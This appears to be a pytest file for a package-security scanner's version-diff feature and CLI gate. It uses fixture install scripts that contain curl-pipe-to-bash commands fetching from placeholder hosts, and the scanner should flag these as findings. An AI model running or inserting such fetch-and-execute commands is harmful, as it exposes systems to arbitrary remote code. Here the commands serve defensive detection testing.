"""Diffing two component versions: engine module and CLI command."""

from __future__ import annotations

import json
from pathlib import Path

from skilltotal.cli import EXIT_ERROR, EXIT_FAIL_ON_HIGH, EXIT_OK, main
from skilltotal.diff import diff_reports, max_new_severity
from skilltotal.engine import analyze
from skilltotal.models import Severity


def _make_pkg(root: Path, name: str, extra_files: dict[str, str] | None = None) -> Path:
    pkg = root / name
    pkg.mkdir()
    (pkg / "package.json").write_text(
        json.dumps({"name": "demo", "version": "1.0.0"}), encoding="utf-8"
    )
    (pkg / "index.js").write_text('console.log("hello");\n', encoding="utf-8")
    for rel, content in (extra_files or {}).items():
        (pkg / rel).write_text(content, encoding="utf-8")
    return pkg


PIPE_EXEC = "curl http://updates.example.test/run.sh | bash\n"


def test_new_finding_and_risk_delta(tmp_path: Path):
    old = analyze(str(_make_pkg(tmp_path, "v1"))).to_dict()
    new = analyze(
        str(_make_pkg(tmp_path, "v2", {"install.sh": PIPE_EXEC}))
    ).to_dict()

    diff = diff_reports(old, new)
    assert "ST-SHELL-PIPE-EXEC" in {f["id"] for f in diff.new_findings}
    assert diff.risk_score_delta > 0
    assert not diff.resolved_findings
    assert diff.ruleset_mismatch is False
    assert "new finding(s)" in diff.summary


def test_resolved_finding_on_reverse_diff(tmp_path: Path):
    old = analyze(
        str(_make_pkg(tmp_path, "v1", {"install.sh": PIPE_EXEC}))
    ).to_dict()
    new = analyze(str(_make_pkg(tmp_path, "v2"))).to_dict()

    diff = diff_reports(old, new)
    assert "ST-SHELL-PIPE-EXEC" in {f["id"] for f in diff.resolved_findings}
    assert diff.risk_score_delta < 0
    assert not diff.new_findings


def test_evidence_level_change_within_same_rule(tmp_path: Path):
    old = analyze(
        str(_make_pkg(tmp_path, "v1", {"install.sh": PIPE_EXEC}))
    ).to_dict()
    new = analyze(
        str(
            _make_pkg(
                tmp_path,
                "v2",
                {"install.sh": PIPE_EXEC + "curl http://second.example.test/x.sh | sh\n"},
            )
        )
    ).to_dict()

    diff = diff_reports(old, new)
    changed = {c["id"]: c for c in diff.changed_findings}
    assert "ST-SHELL-PIPE-EXEC" in changed
    assert len(changed["ST-SHELL-PIPE-EXEC"]["added_evidence"]) == 1
    assert not changed["ST-SHELL-PIPE-EXEC"]["removed_evidence"]
    # The rule exists on both sides, so it is neither new nor resolved.
    assert not diff.new_findings
    assert not diff.resolved_findings


def test_identical_reports_produce_empty_diff(tmp_path: Path):
    report = analyze(str(_make_pkg(tmp_path, "v1", {"install.sh": PIPE_EXEC}))).to_dict()
    diff = diff_reports(report, report)
    assert not diff.new_findings
    assert not diff.resolved_findings
    assert not diff.changed_findings
    assert diff.risk_score_delta == 0
    assert max_new_severity(diff) is None


def test_max_new_severity_counts_added_evidence(tmp_path: Path):
    old = analyze(
        str(_make_pkg(tmp_path, "v1", {"install.sh": PIPE_EXEC}))
    ).to_dict()
    new = analyze(
        str(
            _make_pkg(
                tmp_path,
                "v2",
                {"install.sh": PIPE_EXEC + "curl http://second.example.test/x.sh | sh\n"},
            )
        )
    ).to_dict()
    diff = diff_reports(old, new)
    assert max_new_severity(diff) == Severity.HIGH


def test_ruleset_mismatch_flag(tmp_path: Path):
    report = analyze(str(_make_pkg(tmp_path, "v1"))).to_dict()
    stale = json.loads(json.dumps(report))
    stale["metadata"]["ruleset_version"] = -1
    diff = diff_reports(stale, report)
    assert diff.ruleset_mismatch is True


def test_cli_diff_text_and_gate(tmp_path: Path, capsys):
    v1 = _make_pkg(tmp_path, "v1")
    v2 = _make_pkg(tmp_path, "v2", {"install.sh": PIPE_EXEC})

    code = main(["diff", str(v1), str(v2)])
    out = capsys.readouterr().out
    assert code == EXIT_OK
    assert "SkillTotal Diff Report" in out
    assert "ST-SHELL-PIPE-EXEC" in out

    code = main(["diff", str(v1), str(v2), "--fail-on-new", "high"])
    capsys.readouterr()
    assert code == EXIT_FAIL_ON_HIGH

    # Nothing new at/above the threshold -> gate passes.
    code = main(["diff", str(v2), str(v2), "--fail-on-new", "low"])
    capsys.readouterr()
    assert code == EXIT_OK


def test_cli_diff_saved_reports_and_output(tmp_path: Path, capsys):
    v1 = _make_pkg(tmp_path, "v1")
    v2 = _make_pkg(tmp_path, "v2", {"install.sh": PIPE_EXEC})
    old_json = tmp_path / "old-report.json"
    new_json = tmp_path / "new-report.json"
    old_json.write_text(json.dumps(analyze(str(v1)).to_dict()), encoding="utf-8")
    new_json.write_text(json.dumps(analyze(str(v2)).to_dict()), encoding="utf-8")

    out_file = tmp_path / "diff.json"
    code = main(
        ["diff", str(old_json), str(new_json), "--json", "--output", str(out_file)]
    )
    out = capsys.readouterr().out
    assert code == EXIT_OK
    data = json.loads(out)
    assert data["risk_score_delta"] > 0
    written = json.loads(out_file.read_text(encoding="utf-8"))
    assert written == data


def test_cli_diff_missing_source_errors(tmp_path: Path, capsys):
    v1 = _make_pkg(tmp_path, "v1")
    code = main(["diff", str(v1), str(tmp_path / "does_not_exist_xyz")])
    err = capsys.readouterr().err
    assert code == EXIT_ERROR
    assert "error:" in err
